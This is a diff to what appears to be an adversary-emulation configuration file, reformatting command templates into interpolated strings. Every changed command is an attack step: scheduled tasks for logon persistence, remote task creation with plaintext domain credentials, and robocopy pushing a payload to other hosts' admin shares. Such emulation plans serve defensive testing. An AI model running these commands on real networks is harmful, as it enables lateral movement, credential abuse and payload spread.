@@ -151,17 +151,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "schtasks /create /f /tn ",
-                            "self.target_1_elevated_taskname",
-                            " /tr ",
-                            "self.target_1_elevated_payload_destination",
-                            "\\",
-                            "self.payload_name",
-                            " /sc onlogon"
-                        ]
-                    }
+                    "command": "schtasks /create /f /tn ${self.target_1_elevated_taskname} /tr ${self.target_1_elevated_payload_destination}\\${self.payload_name} /sc onlogon"
                 }
             }
         },
@@ -250,35 +240,7 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{schtasks /create /f /tn \"",
-                            "self.target_2_taskname",
-                            "\" /ST 23:58 /sc once /tr cmd.exe /ru ",
-                            "self.target_1_elevated_username",
-                            " /rp ",
-                            "self.target_1_elevated_password",
-                            "; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\",
-                            "self.target_2_hostname",
-                            " /user:",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " ",
-                            "self.target_2_password",
-                            "\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\",
-                            "self.target_2_hostname",
-                            "\\c$\\users\\public ",
-                            "self.payload_name",
-                            "\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"",
-                            "self.target_2_taskname",
-                            "\" -user ",
-                            "self.target_1_elevated_username",
-                            " -password ",
-                            "self.target_1_elevated_password",
-                            " }"
-                        ]
-                    }
+                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru ${self.target_1_elevated_username} /rp ${self.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${self.target_2_hostname} /user:${self.target_2_username}@${self.domain} ${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${self.target_2_hostname}\\c$\\users\\public ${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user ${self.target_1_elevated_username} -password ${self.target_1_elevated_password} }"
                 }
             }
         },
@@ -293,12 +255,7 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "schtasks /run /tn ",
-                            "self.target_2_taskname"
-                        ]
-                    }
+                    "command": "schtasks /run /tn ${self.target_2_taskname}"
                 }
             }
         },
@@ -312,28 +269,7 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ",
-                            "self.target_2_taskname",
-                            " /TR c:\\users\\public\\",
-                            "self.payload_name",
-                            " /RL highest /u ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /p ",
-                            "self.target_2_password",
-                            " /ru ",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " /rp ",
-                            "self.target_2_password",
-                            " /s ",
-                            "self.target_2_hostname"
-                        ]
-                    }
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_2_taskname} /TR c:\\users\\public\\${self.payload_name} /RL highest /u ${self.target_2_username}@${self.domain} /p ${self.target_2_password} /ru ${self.target_2_username}@${self.domain} /rp ${self.target_2_password} /s ${self.target_2_hostname}"
                 }
             }
         },
@@ -370,12 +306,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "robocopy c:\\users\\public\\ \\\\file\\share ",
-                            "self.payload_name"
-                        ]
-                    }
+                    "command": "robocopy c:\\users\\public\\ \\\\file\\share ${self.payload_name}"
                 }
             }
         },
@@ -389,23 +320,7 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{schtasks /create /f /tn \"",
-                            "self.target_2_taskname",
-                            "\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:",
-                            "self.target_2_username",
-                            "@",
-                            "self.domain",
-                            " ",
-                            "self.target_2_password",
-                            "\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public ",
-                            "self.payload_name",
-                            "\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"",
-                            "self.target_2_taskname",
-                            "\" }"
-                        ]
-                    }
+                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain} ${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public ${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" }"
                 }
             }
         },
